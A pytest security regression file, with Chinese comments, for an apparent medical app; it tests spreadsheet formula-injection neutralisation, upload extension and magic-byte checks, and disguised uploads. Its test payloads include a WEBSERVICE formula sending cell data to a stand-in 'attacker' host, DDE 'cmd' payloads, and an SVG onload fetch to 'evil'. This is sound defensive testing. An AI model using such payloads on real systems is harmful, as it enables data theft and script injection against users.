"""安全回归测试：导出公式注入 / 上传扩展名校验 / viewer_url 协议白名单。

对应安全审计发现：
- F3: 患者姓名等字段以 = + - @ 开头时，导出的 CSV/XLSX 会被 Excel 当公式执行
- F1: 上传仅凭客户端 Content-Type 白名单可被伪造，扩展名+魔数必须一致
- F5: viewer_url 必须限制 https://，防 javascript: 注入前端 window.open
"""

import pytest

from app.routers.data_import_export import _sanitize_cell
from app.routers.research import _sanitize_formula
from app.routers.upload import ALLOWED_DOC_EXTS, ALLOWED_IMAGE_EXTS, _normalized_ext, _sniff_ext


class TestFormulaInjection:
    def test_csv_export_neutralizes_formula_prefixes(self):
        payloads = [
            '=WEBSERVICE("http://attacker/?d="&A2)',
            "+cmd|' /C calc'!A1",
            "-2+3",
            "@SUM(A1:A2)",
            "\t=WEBSERVICE(\"x\")",
            "\r=cmd|' /C calc'!A1",
        ]
        for p in payloads:
            sanitized = _sanitize_formula(p)
            assert sanitized.startswith("'"), f"未中和: {p!r} -> {sanitized!r}"
            assert sanitized[1:] == p

    def test_xlsx_export_neutralizes_formula_prefixes(self):
        for p in ["=1+1", "+1", "-1", "@x", "\t=y", "\r=z"]:
            assert _sanitize_cell(p).startswith("'")

    def test_normal_values_untouched(self):
        assert _sanitize_formula("张三") == "张三"
        assert _sanitize_formula("13800138000") == "13800138000"
        assert _sanitize_cell(None) is None
        assert _sanitize_cell(42) == 42


class TestUploadWhitelist:
    def test_extension_whitelist_excludes_executables(self):
        for ext in (".html", ".svg", ".php", ".jsp", ".aspx", ".shtml", ".xht", ".bin"):
            assert ext not in ALLOWED_IMAGE_EXTS
            assert ext not in ALLOWED_DOC_EXTS

    def test_sniff_detects_real_types(self):
        assert _sniff_ext(b"\xff\xd8\xff\xe0..." + b"x" * 100) == ".jpg"
        assert _sniff_ext(b"\x89PNG\r\n\x1a\n" + b"x" * 100) == ".png"
        assert _sniff_ext(b"%PDF-1.7 ...") == ".pdf"
        # HTML 伪装成图片：魔数识别不出图片类型 → 与扩展名不符被拒
        assert _sniff_ext(b"<svg xmlns='http://www.w3.org/2000/svg' onload='x'/>") is None

    def test_jpeg_extension_normalized(self):
        assert _normalized_ext("photo.JPEG") == ".jpg"
        assert _normalized_ext("photo.jpeg") == ".jpg"
        assert _normalized_ext("photo.PNG") == ".png"


@pytest.mark.asyncio
class TestUploadEnpointSecurity:
    async def test_upload_avatar_rejects_html_disguised_as_image(self, async_client, seed_data, auth_headers):
        headers = auth_headers(seed_data["patient_user"].username)
        r = await async_client.post(
            "/api/upload/avatar",
            headers=headers,
            files={"file": ("avatar.html", b"<html><script>alert(1)</script></html>", "image/png")},
        )
        # 内容魔数与扩展名均不在白名单 → 拒绝
        assert r.status_code == 400

    async def test_upload_report_rejects_svg_with_script(self, async_client, seed_data, auth_headers):
        headers = auth_headers(seed_data["patient_user"].username)
        svg = b"<svg xmlns='http://www.w3.org/2000/svg' onload='fetch(\"http://evil/\")'/>"
        r = await async_client.post(
            "/api/upload/report",
            headers=headers,
            files={"file": ("report.svg", svg, "application/pdf")},
        )
        assert r.status_code == 400

    async def test_upload_avatar_accepts_real_png(self, async_client, seed_data, auth_headers, tmp_path):
        headers = auth_headers(seed_data["patient_user"].username)
        png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
        r = await async_client.post(
            "/api/upload/avatar",
            headers=headers,
            files={"file": ("a.png", png, "image/png")},
        )
        assert r.status_code == 200
        assert r.json()["code"] == 200
